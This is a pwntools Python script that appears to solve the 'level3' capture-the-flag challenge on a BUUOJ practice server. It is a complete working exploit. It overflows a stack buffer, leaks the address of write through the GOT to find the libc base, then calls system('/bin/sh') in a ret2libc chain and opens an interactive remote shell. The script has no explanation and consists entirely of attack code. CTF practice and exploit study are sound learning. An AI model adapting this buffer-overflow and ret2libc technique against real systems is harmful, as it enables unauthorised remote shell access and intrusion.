from pwn import *
from LibcSearcher import *

context.arch = 'i386'
context.log_level = 'debug'

# Preliminaries
elf = ELF('../level3')
libc = ELF('../libc-2.23.so')
target = remote('node4.buuoj.cn', 26553)

write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']

# Leak the address of libc.
payload = b'a' * 0x88 + b'a' * 0x4 + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
target.sendlineafter('Input:\n', payload)
write_addr = u32(target.recvuntil(b'\xf7')[-4:])
libc_base = write_addr - libc.sym['write']
print('[+] The base address of libc is {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
shell = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * 0x88 + b'a' * 0x4 + p32(system) + p32(0) + p32(shell)
target.sendlineafter('Input:\n', payload)
target.interactive()